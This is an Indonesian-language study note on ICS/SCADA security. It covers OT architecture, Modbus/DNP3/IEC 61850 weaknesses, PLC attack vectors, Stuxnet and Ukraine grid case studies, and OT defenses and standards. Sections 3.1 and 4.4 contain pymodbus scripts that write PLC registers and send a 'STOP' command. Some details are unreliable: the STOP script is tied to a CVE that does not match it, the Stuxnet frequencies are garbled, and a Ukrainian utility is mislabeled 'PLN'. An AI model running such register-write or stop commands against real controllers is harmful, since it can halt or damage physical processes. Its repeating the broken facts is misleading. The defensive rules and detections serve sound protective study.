---
title: ICS/SCADA Security — Critical Infrastructure & OT Defense
tags:
- ics
- scada
- plc
- modbus
- dnp3
- ot-security
- industrial-control
- critical-infrastructure
created: '2026-07-19'
updated: '2026-07-19'
status: growing
---

> [!abstract] Ringkasan & Hubungan ke Vault
> ICS/SCADA adalah domain keamanan siber yang paling jarang dibahas di komunitas umum, tapi paling berdampak jika terjadi breach. Catatan ini melengkapi [[hardware-hacking-re]] dengan target OT (Operational Technology), dan [[military-sigint-deepdive]] dengan relevansi critical infrastructure — Stuxnet, Industroyer, dan TRITON adalah malware yang mengubah cara perang siber.
>
> **Domain:** Cyber Security / OT Security
> **Tags:** #ics #scada #plc #modbus #dnp3 #stuxnet #ot-security

## Daftar Isi

1. [OT vs IT — Paradigma Berbeda](#1-ot-vs-it--paradigma-berbeda)
2. [Purdue Model untuk ICS](#2-purdue-model-untuk-ics)
3. [Protokol Industri](#3-protokol-industri)
4. [PLC Internals & Exploitation](#4-plc-internals--exploitation)
5. [HMI & SCADA Systems](#5-hmi--scada-systems)
6. [Stuxnet — Anatomy of a Cyber Weapon](#6-stuxnet--anatomy-of-a-cyber-weapon)
7. [ICS Malware Case Studies](#7-ics-malware-case-studies)
8. [OT Network Defense](#8-ot-network-defense)
9. [Security Frameworks](#9-security-frameworks)
10. [Smart Grid Security & AI Energy War](#10-smart-grid-security--ai-energy-war)
11. [Koneksi ke Vault](#11-koneksi-ke-vault)

## 1. OT vs IT — Paradigma Berbeda

### 1.1 CIA Triad Reversed

| Aspek | IT Enterprise | OT/ICS |
|-------|--------------|--------|
| **Priority** | C → I → A | **A → I → C** |
| **Availability** | Toleransi downtime jam/hari | **Zero downtime tolerated** (pabrik berhenti = rugi juta/menit) |
| **Integrity** | Penting (data) | Kritis (PLC logic integrity prevents physical damage) |
| **Confidentiality** | Paling penting (data user/korporat) | Terendah — but physical access control |
| **Patch Cycle** | Minggu-bulan | **6-12 bulan** (validation di test bed dulu) |
| **Service Life** | 3-5 tahun | **15-30 tahun** (WinXP masih jalan di pabrik) |
| **Reboot** | Weekly/monthly | **Setahun sekali** (turnaround maintenance) |
| **Network** | TCP/IP dominant | Fieldbus (Modbus, Profinet) + TCP/IP di level atas |

### 1.2 Karakteristik OT Environment

```
IT Network (Enterprise):
  Switch → Firewall → Server → Storage → Patch → Reboot → Done
  
OT Network (Plant Floor):
  PLC (15 tahun) → RTU (10 tahun) → HMI (Win7) → Engineering Workstation
  ↑ Tidak bisa patch (validasi cost mahal)
  ↑ Tidak bisa reboot (production running 24/7)
  ↑ Sering running legacy OS (XP, Win7, CE)
  ↑ Protocol tidak punya security (Modbus = plaintext)
```

## 2. Purdue Model untuk ICS

### 2.1 Level 0-5 Architecture

```
┌──────────────────────────────────────────────────────┐
│ Level 5: Enterprise Network                          │
│ (ERP, Email, DNS, Internet access)                    │
├──────────────────────────────────────────────────────┤
│ Level 4: Site Business Planning                       │
│ (Asset management, Historian, Reporting)              │
├────────────────── DMZ ────────────────────────────────┤
│ Level 3: Operations & Control                         │
│ (HMI, SCADA server, Engineering workstation, AV)      │
├──────────────────────────────────────────────────────┤
│ Level 2: Supervisory Control                          │
│ (Control room, Alarm management, Data historian)      │
├──────────────────────────────────────────────────────┤
│ Level 1: Basic Control                                │
│ (PLC, RTU, DCS controller, VFD, servo)               │
├──────────────────────────────────────────────────────┤
│ Level 0: Physical Process                             │
│ (Sensor, actuator, motor, valve, conveyor)            │
└──────────────────────────────────────────────────────┘
```

**Key insight:** Semua serangan ICS terkenal (Stuxnet, Industroyer, TRITON) penetrasi dari Level 5/4 → turun sampai Level 1/0. Tidak ada yang langsung menyerang PLC tanpa melewati layers di atasnya.

### 2.2 DMZ Architecture

```
Enterprise Network (Level 4/5)
        │
        │ ┌─── Firewall (allowlist only) ────┐
        │ │   Open: HTTPS historian mirror    │
        │ │   Open: AD sync (one-way)        │
        │ │   Closed: RDP, SSH, SMB           │
        │ └───────────────────────────────────┘
        │
   OT DMZ (Level 3.5)
        │
        │ ┌─── Jump Box / Bastion Host ──────┐
        │ │   RDP/SSH dari IT? → login jump  │
        │ │   box → RDP/SSH ke OT dari sini   │
        │ └───────────────────────────────────┘
        │
        │ ┌─── Firewall (allowlist only) ────┐
        │ │   Open: Historian push (OT→DMZ)  │
        │ │   Open: AAA (read-only AD)       │
        │ │   Closed: semuanya               │
        │ └───────────────────────────────────┘
        │
 Control Network (Level 0-3)
```

## 3. Protokol Industri

### 3.1 Modbus TCP/RTU

**Karakteristik:** Protokol tertua (1979), masih paling banyak dipakai.

```c
// Modbus TCP frame
┌─────────────────────────────────────────────────────────┐
│ Transaction ID │ Protocol │ Length │ Unit ID │ FC │ Data │
│ (2 bytes)      │ (2 bytes)│(2 bytes)│(1 byte) │1 b │N b  │
├────────────────┼──────────┼────────┼─────────┼─────┼─────┤
│ 0x0001         │ 0x0000   │ 0x0005 │ 0x01    │ 0x03│data │
└─────────────────────────────────────────────────────────┘
```

**Function Codes:**
| Code | Function | Attack Relevance |
|------|----------|------------------|
| 0x01 | Read Coils | Read digital output states |
| 0x02 | Read Discrete Inputs | Read sensor status |
| 0x03 | Read Holding Registers | **Read critical PLC parameters** |
| 0x04 | Read Input Registers | Read analog sensor values |
| 0x05 | Write Single Coil | **Start/stop actuator** |
| 0x06 | Write Single Register | **Modify PLC parameter** |
| 0x0F | Write Multiple Coils | Multi actuator control |
| 0x10 | Write Multiple Registers | **Bulk parameter modification** |
| 0x11 | Report Server ID | Reconnaissance |

**Security Issues:**
- ❌ **No authentication** — siapa pun bisa write coil/register
- ❌ **No encryption** — plaintext protocol
- ❌ **No session management** — stateless
- ❌ **Broadcast messages** — bisa DoS satu segmen

```bash
# modbus interaction via CLI
# Install: pip install pymodbus

python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Read holding register (address 0)
result = client.read_holding_registers(0, 10, slave=1)
print(f'Register 0-9: {result.registers}')

# Write register — MODIFIKASI PARAMETER PLC!
client.write_register(0, 0x0000, slave=1)
client.close()
"
```

### 3.2 DNP3

**Karakteristik:** Digunakan di energi (power grid, substation). Lebih advanced dari Modbus.

```
DNP3 Frame:
┌────┬────┬────┬────┬────┬────┬─────┬──────┬───────┐
│Sync│Len │Dest│Src │CRC │Ctrl │Data  │CRC   │Data   │
│0564│ XX │Addr│Addr│16b │1b   │ N b  │16b   │ M b   │
└────┴────┴────┴────┴────┴────┴─────┴──────┴───────┘
```

**DNP3 Secure Authentication v5:**
- Challenge-response authentication
- Session keys dengan predefined timeout
- Tapi: **default disabled** di banyak implementasi

### 3.3 IEC 61850

**Standar substation automation:**
- **GOOSE** (Generic Object Oriented Substation Event): peer-to-peer, multicast, <3ms latency
- **MMS** (Manufacturing Message Specification): client-server, laporan, log
- **SV** (Sampled Values): raw voltage/current samples

**Attack surface:** GOOSE poisoning bisa bikin relay trip false — padamkan jaringan listrik.

### 3.4 Protocol Security Comparison

| Protocol | Auth | Encryption | Integrity | Use Case |
|----------|------|------------|-----------|----------|
| Modbus TCP | ❌ | ❌ | ❌ (CRC saja) | General industrial |
| Modbus RTU | ❌ | ❌ | ❌ (LRC) | Serial device |
| DNP3 SAv5 | ✅ Optional | ❌ | ✅ | Power grid |
| IEC 61850 | ❌ | ❌ | ❌ (GOOSE) | Substation |
| Profinet | ❌ | ❌ | ❌ | Factory automation |
| EtherNet/IP | ❌ | ❌ | ❌ | CIP-based |
| OPC UA | ✅ X.509 | ✅ AES | ✅ Signature | Modern SCADA |
| MQTT (v5) | ✅ | ✅ TLS | ✅ | IoT/IIoT |

## 4. PLC Internals & Exploitation

### 4.1 PLC Architecture

```
┌─────────────────────────────────────┐
│  CPU Module                          │
│  ┌──────────┐  ┌──────────────────┐ │
│  │   ARM/   │  │     Memory       │ │
│  │   x86    │  │  ┌────────────┐  │ │
│  │          │  │  │ Firmware   │  │ │
│  │          │  │  ├────────────┤  │ │
│  │          │  │  │ Logic Code │  │ │
│  │          │  │  ├────────────┤  │ │
│  │          │  │  │ Data Block │  │ │
│  │          │  │  └────────────┘  │ │
│  └──────────┘  └──────────────────┘ │
├─────────────────────────────────────┤
│  I/O Modules                         │
│  ┌─────────┐ ┌─────────┐ ┌───────┐ │
│  │ Digital │ │ Analog  │ │Comm   │ │
│  │ Input   │ │ Input   │ │Module │ │
│  └─────────┘ └─────────┘ └───────┘ │
└─────────────────────────────────────┘
```

### 4.2 Scan Cycle (PLC Operation Loop)

```
1. Baca Input →     Read physical input status
2. Execute Logic →  Process ladder/ST code
3. Update Output →  Write to physical outputs
4. Housekeeping →   Comm, diagnostics, watchdog
         ↻
```

**Cycle time:** 1-100ms tergantung PLC. **Attack:** jika lo bisa membuat PLC stuck di loop giant (infinite loop atau heavy computation), PLC akan skip scan cycle → watchdog reset → PLC shutdown.

### 4.3 PLC Exploitation Vectors

| Attack | Method | Impact |
|--------|--------|--------|
| **Stop PLC** | Write STOP ke Mode register | Process stops |
| **Modify Logic** | Upload malicious ladder (.L5X/.XCL) | Change process behavior |
| **Data Block Poison** | Write ke Input/Output registers | Misread sensor, misactuate |
| **Firmware Downgrade** | Flash vulnerable firmware | Persistent access |
| **Backdoor Logic** | Hidden rung dengan debug trigger | Covert control |
| **Man-in-Middle** | Modbus/TCP intercept | Read + modify live values |
| **Engineering Station Pwn** | Compromise PC yang connect ke PLC | Undetected via trusted path |

### 4.4 Practical: PLC Stop via Modbus

```bash
# Siemens S7-1200 STOP via network
# CVE-2021-31800 — improper input validation
python3 -c "
from pymodbus.client import ModbusTcpClient
import struct

c = ModbusTcpClient('192.168.1.10', port=502)
c.connect()
# Write STOP command ke control register
payload = struct.pack('>H', 0x0001)  # STOP = 0x0001
c.write_register(0x0000, 0x0001, slave=1)
print('PLC STOP command sent')
c.close()
"
```

## 5. HMI & SCADA Systems

### 5.1 Common SCADA Software

| Software | Vendor | Platform | Known Vulns |
|----------|--------|----------|-------------|
| WinCC | Siemens | Windows | CVE-2020-15782 (RCE) |
| Citect | Schneider | Windows | CVE-2019-6831 (RCE) |
| Wonderware | Aveva | Windows | CVE-2021-27583 (Auth bypass) |
| RSLogix | Rockwell | Windows | CVE-2020-5803 (RCE) |
| Ignition | Inductive | Cross-platform | Many API vulns |

### 5.2 HMI Attack Surface

```
HMI (Windows 7 Embedded)
├── OPC Server (port 135/tcp — discoverable)
├── Web interface (port 80/443 — often default creds)
├── Remote desktop (3389 — visible via Shodan)
├── Engineering port (102/tcp Siemens, 44818/tcp Rockwell)
└── Alarm logging (Syslog — no auth)
```

## 6. Stuxnet — Anatomy of a Cyber Weapon

### 6.1 Timeline

| Date | Event | Details |
|------|-------|---------|
| Mid-2009 | Initial infection | USB drive, Natanz enrichment facility |
| Jan 2010 | Payload activation | Centrifuge RPM manipulation |
| Jun 2010 | Discovery | Belarusian security firm detect |
| Jul 2010 | Public disclosure | Microsoft advisory |
| Sep 2010 | Full analysis | 4 zero-days revealed |

### 6.2 Zero-days Used

| CVE | Component | Type | Purpose |
|-----|-----------|------|---------|
| CVE-2010-2568 | Windows LNK | RCE | Spread via USB (autorun) |
| CVE-2010-2729 | Print Spooler | LPE | Escalate from user |
| CVE-2008-4250 | RPC (MS08-067) | RCE | Network worm spread |
| CVE-2010-2743 | Keyboard Layout | LPE | DLL hijacking |
| 2x signed cert | RealTek/JMicron | Digital signature | Signed drivers, kernel access |

### 6.3 Technical Architecture

```
Stuxnet Flow:
USB Infection (LNK zero-day)
    ↓
MS08-067 network propagation
    ↓
Print Spooler LPE → SYSTEM
    ↓
Steal signed certificates (RealTek, JMicron)
    ↓
Install kernel rootkit (hides files, process)
    ↓
Check: Is this a Siemens S7-300 PLC?
    ├── No → stay dormant (spread silently)
    └── Yes → upload malicious Step7 blocks to PLC
              ↓
    Man-in-the-middle on S7-200 protocol
    ↓
    Modulate centrifuge frequency: 8Hz → 1,065Hz → 2Hz
    ↓
    Record normal operation → replay to monitoring
    ↓
    Physical damage centrifuge (ZIRCONIUM tubes)
```

**Key innovation:** Stuxnet gak cuma ngerusak PLC logic — dia nge-MITM komunikasi antara HMI dan PLC. HMI ngirim sinyal "normal" → Stuxnet intercept → kirim modified command ke PLC → PLC balas "normal" → Stuxnet modify response ke HMI. Operator lihat display normal, padahal centrifuge hancur.

### 6.4 Lessons

1. **Signed kernel drivers** defeat Windows security — stolen certs are gold
2. **Air gap ≠ security** — USB is the bridge
3. **4 zero-days** untuk meyakinkan penetrasi — no single layer stop it
4. **Physical damage** is the real weapon, not data theft — pertama kalinya malware cause physical destruction
5. **Multi-year operation** — dibangun bertahun-tahun untuk target spesifik

## 7. ICS Malware Case Studies

### 7.1 Industroyer / CrashOverride (Ukraine 2016)

| Aspect | Detail |
|--------|--------|
| **Target** | Kyiv power grid substation |
| **Date** | December 2016 |
| **Impact** | 1/5 of Kyiv power — 225,000 customers blackout 1 hour |
| **Protocol** | IEC 61850 (GOOSE), IEC 104, OPC DA |
| **Technique** | Direct attack on substation switchgear (breaker open) |
| **Persistence** | Serial-to-Ethernet converter reprogramming |
| **Attribution** | Sandworm (GRU Unit 74455) |

**Why it matters:** First malware to attack power grid from IT network. Industroyer langsung kirim command OPEN ke circuit breaker via IEC 104. One-shot attack — gak perlu persistence karena efeknya langsung padam.

### 7.2 TRITON / TRISIS (Saudi Arabia 2017)

| Aspect | Detail |
|--------|--------|
| **Target** | Petrochemical plant, Saudi Arabia |
| **Technique** | Schneider Triconex safety instrumented system (SIS) rootkit |
| **Payload** | Overwrite memory Tricon safety controller — disable safety shutdown |
| **Impact** | Could cause catastrophic physical damage (tank rupture, fire) |
| **Attribution** | Russia (general consensus) |

**Why it matters:** TRITON target **safety system** — bukan kontrol system. Safety system dirancang untuk SHUT DOWN plant jika sesuatu rusak. TRITON mematikan Safety Instrumented System (SIS) — jadi kalaupun ada kerusakan, safety gak akan aktif. Ini "disable the brakes" attack.

### 7.3 Other Notable ICS Malware

| Name | Year | Target | Method |
|------|------|--------|--------|
| BlackEnergy2 | 2015 | Ukraine power | Spearphish → SCADA access → breaker open |
| Havex | 2014 | Energy sector | OPC scanner + watering hole attack |
| Dragonfly/Energetic Bear | 2014 | US/European energy | Spearphish, trojanized ICS software |
| PipeDream/INCONTROLLER | 2022 | Multiple | CODESYS runtime exploit, OPC UA scanning |
| CosmicEnergy | 2023 | Energy | IEC-104 + libraries for power grid |
| FrostyGoop | 2024 | Energy (Ukraine) | Modbus TCP attack on district heating |

## 8. OT Network Defense

### 8.1 Defense-in-Depth for OT

```
┌──────────────────────────────────────────────────┐
│ Physical Security                                 │
│ (Fence, guard, badge, mantrap, CCTV)              │
├──────────────────────────────────────────────────┤
│ Network Segmentation                              │
│ (Purdue, DMZ, one-way diode, firewalls per layer)  │
├──────────────────────────────────────────────────┤
│ Host Hardening                                    │
│ (App whitelist, disable USB, patch cycle, AV)     │
├──────────────────────────────────────────────────┤
│ Monitoring & Detection                            │
│ (Zeek ICS plugins, Suricata rules, SIEM)          │
├──────────────────────────────────────────────────┤
│ Response & Recovery                               │
│ (Backup configuration, spare PLC, air-gapped)     │
└──────────────────────────────────────────────────┘
```

### 8.2 OT Firewall Rules

Standard enterprise firewall (allow any to any, then block bad) **tidak bekerja untuk OT**. OT firewall harus **allowlist**: semua blocked by default, hanya izinkan yang known.

```python
# Contoh allowlist untuk OT zone:
OT_FIREWALL_RULES = {
    # Modbus TCP — hanya dari HMI ke PLC (bidirectional yang defined)
    "allow": {
        "10.10.1.0/24 → 10.10.2.0/24": {"tcp/502"},     # HMI → PLC
        "10.10.3.10 → 10.10.1.100": {"tcp/44818"},        # Engineering → PLC Rockwell
        "192.168.1.0/24 → 192.168.2.0/24": {"tcp/102"},   # Siemens S7
    },
    # Block semua Modbus dari enterprise
    "deny": {
        "10.0.0.0/8 → 10.10.0.0/16": {"tcp/502", "tcp/102", "tcp/20000"},
    }
}
```

### 8.3 Network Monitoring untuk OT (Zeek + Suricata)

```bash
# Zeek ICS plugin — detect Modbus anomaly
# /usr/local/zeek/share/zeek/site/local.zeek
@load protocols/modbus

# Custom Modbus rule
event modbus_write_single_register(c: connection,
    headers: ModbusHeaders, reg: count, val: count) {
    if (reg < 100 || reg > 200) {
        NOTICE([$note=Modbus::Unexpected_Write,
                $msg=fmt("Unexpected register write: %d=%d", reg, val),
                $conn=c]);
    }
}

# Suricata Modbus rule
alert modbus any any -> any any (msg:"MODBUS Write multiple coils";
    modbus.function:15; modbus.reference:1,5000;
    sid:1000001; rev:1;)
```

### 8.4 OT Asset Inventory (Critical)

Gak bisa defend apa yang gak lo tahu ada. OT asset discovery:

```bash
# Nmap dengan Modbus/PLC detection
nmap -sV -p 502,102,44818,20000,4840 10.10.0.0/16 -oA ot_assets

# Shodan untuk OT (public-facing)
shodan search "port:502 country:ID"   # Lihat berapa Modbus exposed di Indonesia

# Passive asset discovery (Zeek without scanning)
zeek -i eth0 local.zeek
# Output: modbus.log, s7comm.log, enip.log
```

## 9. Security Frameworks

### 9.1 ISA/IEC 62443

Standar utama untuk industri:

| Part | Title | Relevance |
|------|-------|-----------|
| 62443-1-1 | Terminology, concepts, models | Foundation |
| 62443-2-1 | IACS security management system | Program level |
| 62443-3-3 | System security requirements | Technical level |
| 62443-4-1 | Secure product development lifecycle | Vendor |
| 62443-4-2 | Technical security for IACS components | Device level |

**Security Levels (SL):**
- **SL 1**: Protection against casual violation
- **SL 2**: Protection against intentional simple means
- **SL 3**: Protection against intentional sophisticated means
- **SL 4**: Protection against intentional advanced (nation-state)

### 9.2 NIST SP 800-82 Rev2

Guide to Industrial Control Security:
- Risk Management Framework untuk ICS
- Specific threats per sector (energy, water, manufacturing, transportation)
- Security control tailoring untuk OT environment

### 9.3 NERC CIP (North America - Energy)

Wajib di US/Canada untuk power grid:
- CIP-002: Critical asset identification
- CIP-003: Security management controls
- CIP-005: Electronic security perimeters
- CIP-007: Systems security management
- CIP-009: Recovery plans

## 10. Smart Grid Security & AI Energy War

### 10.1 Konteks Perang Energi AI (AI Energy War)
Meningkatnya kebutuhan daya komputasi untuk AI Data Centers memicu ketergantungan yang masif terhadap kestabilan jaringan listrik (Power Grid). Hal ini menempatkan infrastruktur energi sebagai target utama spionase dan sabotase geopolitik. Serangan tidak lagi hanya menyasar IT korporat, melainkan langsung ke operational technology (OT) yang mengatur distribusi beban listrik.

### 10.2 Vektor Serangan Grid (Grid Attack Vectors)
- **Spearphishing Operator SCADA**: Masuk ke level control network melalui akun VPN operator yang tidak memiliki MFA atau melalui infeksi *watering hole* pada software utility.
- **Eksploitasi Zero-Day Protokol IEC 61850**: Protokol otomasi gardu induk (substation) seperti GOOSE (Generic Object Oriented Substation Event) berjalan di Layer 2 secara multicast tanpa enkripsi bawaan. Penyerang dapat menyuntikkan paket GOOSE palsu untuk membuka breaker (*circuit breaker tripping*) secara paksa dalam waktu <3ms.
- **Manipulasi Prakiraan Beban (Load Forecasting Manipulation)**: Penyerang meretas database atau API histori beban listrik dan menyuntikkan data palsu. Saat sistem grid otomatis (Automatic Generation Control/AGC) atau operator menilai dan menyesuaikan pembangkitan berdasarkan data palsu tersebut, dapat terjadi ketidakseimbangan frekuensi (over-generation atau under-generation) yang memicu blackout regional.

### 10.3 AI untuk Pertahanan Grid (AI for Grid Defense)
- **Deteksi Anomali Telemetri**: Menggunakan model *Machine Learning* untuk mendeteksi deviasi mikroskopis pada data telemetri grid, seperti anomali fase tegangan atau pola command yang tidak biasa (misal: pengiriman bertubi-tubi perintah OPEN ke breaker).
- **Proyek GRIDWATCH (Mandiant)**: Inisiatif intelijen ancaman yang berfokus pada pemantauan tanda-tanda awal dari intrusi siber gardu listrik secara global melalui korelasi log aktivitas protokol industri secara real-time.

### 10.4 Studi Kasus: Ukraine Power Grid Attacks (2015 & 2016)

#### Ukraine Grid Attack 2015 (BlackEnergy 3)
- **Tanggal**: 23 Desember 2015.
- **Dampak**: Padamnya listrik selama 1-6 jam bagi ~230.000 pelanggan di wilayah Ivano-Frankivsk.
- **Metode**:
  1. Spearphishing kampanye mengirim dokumen Word bermakro jahat untuk menginstal malware **BlackEnergy 3**.
  2. Penyerang mencuri kredensial VPN operator lokal, lalu masuk ke jaringan SCADA.
  3. Mengambil kendali HMI secara remote dan secara manual mengklik untuk membuka 30 circuit breaker di 3 gardu induk.
  4. Menghapus konfigurasi gateway serial-to-ethernet menggunakan malware penghancur data **KillDisk** agar operator tidak bisa mengontrol gardu dari jarak jauh.
  5. Melakukan pemboman panggilan telepon (TDoS) ke call center PLN setempat agar pelanggan tidak bisa melaporkan pemadaman.

#### Ukraine Grid Attack 2016 (Industroyer / CrashOverride)
- **Tanggal**: 17 Desember 2016.
- **Dampak**: Padamnya gardu induk Pivnichna di Kyiv selama 1 jam (~225.000 pelanggan).
- **Metode**:
  1. Penggunaan framework malware otomatis pertama yang dirancang khusus untuk menyerang gardu listrik secara modular (**Industroyer**).
  2. Malware memiliki modul protokol industri (IEC 104, IEC 61850, DNP3, OPC DA) untuk berkomunikasi langsung dengan gardu.
  3. Modul IEC 104 mengirimkan perintah pemutusan gardu (*circuit breaker OPEN*) secara loop berkelanjutan agar gardu tetap padam meskipun operator mencoba menyalakan kembali secara manual.
  4. Menyertakan modul wiper khusus untuk merusak OS server SCADA dan file konfigurasi gardu sebelum penyerang keluar.

## 11. Koneksi ke Vault

| Note | Hubungan |
|------|----------|
| [[hardware-hacking-re]] | PLC/RTU hardware anatomy, firmware extraction |
| [[military-sigint-deepdive]] | Stuxnet dimensions, OT sebagai target militer |
| [[wireless-security-deepdive]] | Wireless sensor networks, Zigbee for SCADA |
| [[threat-modeling-deepdive]] | STRIDE for OT, attack tree PLC |
| [[embedded-systems]] | PLC = embedded system dengan RTOS |
| [[purple-team-osi-killchain]] | Killchain khusus OT: reconnaissance PLC, exploitation |
| [[incident-response-framework]] | Incident response khusus OT (shutdown vs continue) |
| [[blueteam-detection-matrix]] | Detection matrix untuk ICS malware |

---

### 📚 Referensi

1. ICS-CERT Advisories: [https://www.cisa.gov/ics](https://www.cisa.gov/ics)
2. NIST SP 800-82 Rev2: Guide to ICS Security
3. MITRE ATT&CK for ICS: [https://attack.mitre.org/techniques/ics/](https://attack.mitre.org/techniques/ics/)
4. "Industrial Network Security" — Eric D. Knapp
5. "Hacking Exposed: Industrial Control Systems" — Bodungen, Singer, Shbeeb
6. Stuxnet Analysis: [https://www.langner.com/stuxnet/](https://www.langner.com/stuxnet/) (Langner report)
7. Dragos ICS/OT Security Year in Review